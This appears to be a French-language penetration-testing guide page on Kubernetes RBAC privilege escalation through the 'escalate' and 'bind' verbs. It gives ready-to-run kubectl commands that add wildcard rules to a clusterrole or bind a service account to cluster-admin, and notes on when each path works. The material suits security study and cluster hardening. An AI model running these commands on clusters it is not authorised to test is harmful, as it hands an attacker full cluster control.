---
order: 4
title: "Verbes escalate et bind : s'octroyer des permissions que l'on n'a pas"
description: "Kubernetes empêche normalement une identité de créer un role avec plus de permissions qu'elle n'en détient, mais le verbe escalate sur les roles et le verbe bind sur les rolebindings désactivent ce contrôle. Une identité possédant l'un ou l'autre peut rédiger un role cluster-admin ou s'y associer, escaladant vers le contrôle total à partir d'un octroi initial restreint."
keywords:
  - verbe escalate
  - verbe bind
  - rbac
  - clusterrolebinding
  - escalade de privilèges
---

# Verbes escalate et bind

Le RBAC possède une règle anti-escalade intégrée : pour créer ou mettre à jour un role, vous devez déjà détenir chaque permission que ce role accorde, et pour créer un binding vous devez détenir les permissions du role référencé. Deux verbes contournent délibérément cette règle. Le verbe `escalate` sur les `roles`/`clusterroles` vous laisse écrire un role avec des permissions au-delà des vôtres, et le verbe `bind` sur les `rolebindings`/`clusterrolebindings` vous laisse associer un sujet à un role dont vous ne détenez pas les permissions. L'un comme l'autre défait le confinement et atteint l'admin du cluster.

Vérifiez leur présence :

```bash
kubectl auth can-i escalate clusterroles
kubectl auth can-i bind clusterroles
kubectl auth can-i update clusterroles        # update also allows rewriting a role you can edit
```

## Voie : escalate pour réécrire un role

```bash
# with escalate, add cluster-admin-level rules to a role you can write,
# then ensure your identity is bound to it
kubectl patch clusterrole <role-you-can-edit> --type=json -p='[{"op":"add","path":"/rules/-",
  "value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'
```

## Voie : bind vers cluster-admin

```bash
# with bind, bind your service account directly to the built-in cluster-admin
cat <<YAML | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: x }
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
subjects:
- { kind: ServiceAccount, name: <my-sa>, namespace: <my-ns> }
YAML
# then act with the now-admin identity
kubectl auth can-i '*' '*'
```

## Notes d'exploitation

- `bind` sur le ClusterRole préexistant `cluster-admin` est la voie la plus propre : vous ne rédigez jamais de nouvelles permissions, vous ne faites que référencer un role admin qui existe déjà, de sorte que la seule barrière est le verbe `bind`.
- `escalate` est utilisé lorsqu'aucun role admin adéquat n'existe pour être référencé, ou lorsque vous pouvez déjà éditer un role qui vous est associé ; il vous laisse écrire les permissions directement.
- Ces verbes sont rares dans les clusters bien gérés, précisément parce qu'ils sont une escalade par conception ; trouver l'un ou l'autre dans `auth can-i --list` est une victoire directe.

## Références

- [Kubernetes: privilege escalation prevention](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)
- [Kubernetes: RBAC verbs](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#referring-to-resources)
- [HackTricks: Kubernetes RBAC escalation](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
